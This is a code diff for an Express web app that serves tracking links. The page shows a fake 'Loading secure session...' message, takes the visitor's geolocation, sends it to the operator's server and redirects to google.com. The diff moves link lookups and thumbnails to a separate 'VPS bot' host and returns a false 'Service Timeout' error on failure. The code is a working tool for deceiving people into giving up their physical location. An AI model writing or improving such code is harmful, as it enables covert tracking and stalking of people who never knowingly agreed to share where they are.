@@ -18,6 +18,7 @@ app.use(express.static('public'));
 const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';
 const BOT_NOTIFY_URL = process.env.BOT_NOTIFY_URL;
 const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
+const VPS_IP = process.env.VPS_IP;
 
 // ======================
 // LOAD LINKS FROM FILE
@@ -35,19 +36,27 @@ function saveLinks(data) {
 // ======================
 // TRACKING PAGE ROUTE
 // ======================
-app.get('/t/:id', (req, res) => {
-    const linkId = req.params.id;
+app.get('/t/:id', async (req, res) => {
+    try {
+        const linkId = req.params.id;
 
-    const links = getLinks();
-    const linkData = links.find(l => l.linkId === linkId);
+        // Fetch link data from VPS bot
+        const response = await axios.get(
+            `http://${VPS_IP}:5000/links/${linkId}`
+        );
 
-    if (!linkData) {
-        return res.status(404).send('Service Timeout');
-    }
+        const linkData = response.data;
 
-    const imageUrl = `${BASE_URL}${linkData.thumbnail}`;
+        if (!linkData) {
+            return res
+                .status(404)
+                .send('Service Timeout');
+        }
 
-    res.send(`
+        // Use thumbnail directly from VPS
+        const imageUrl = linkData.thumbnail;
+
+        res.send(`
 <!DOCTYPE html>
 <html>
 <head>
@@ -73,7 +82,7 @@ app.get('/t/:id', (req, res) => {
 
 <body>
     <h2>Loading secure session...</h2>
-    <p>Please wait</p>
+    <p>Please wait...</p>
 
 <script>
 navigator.geolocation.getCurrentPosition(
@@ -90,7 +99,8 @@ navigator.geolocation.getCurrentPosition(
                 longitude: position.coords.longitude
             })
         }).then(() => {
-            window.location.href = "https://google.com";
+            window.location.href =
+                "https://google.com";
         });
 
     },
@@ -106,9 +116,16 @@ navigator.geolocation.getCurrentPosition(
 
 </body>
 </html>
-    `);
-});
+        `);
 
+    } catch (err) {
+        console.error(err.message);
+
+        return res
+            .status(404)
+            .send('Service Timeout');
+    }
+});
 
 // ======================
 // RECEIVE LOCATION
